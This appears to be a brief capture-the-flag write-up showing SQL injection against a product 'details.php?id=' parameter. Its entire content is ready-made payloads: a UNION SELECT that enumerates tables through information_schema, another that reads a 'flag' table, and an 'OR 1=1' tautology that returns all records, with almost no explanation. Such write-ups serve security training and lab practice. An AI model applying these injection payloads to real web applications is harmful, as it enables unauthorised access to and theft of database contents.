SQL Injection
=============

The base URL is:

```
/details.php?id=4
```

Get all tables:

```sql
%20 UNION SELECT TABLE_NAME AS name, '' AS brand, '' AS variant, TABLE_SCHEMA AS color, 0 AS price, 0 AS inventory FROM information_schema.TABLES WHERE table_schema LIKE 'socks%'
```

Get the flag:

```sql
%20 UNION SELECT flag AS NAME, '' AS BRAND, '' AS VARIANT, '' AS COLOR, 0 AS price, 0 AS inventory FROM flag
```

Get all records:

```sql
%20 OR 1=1
```
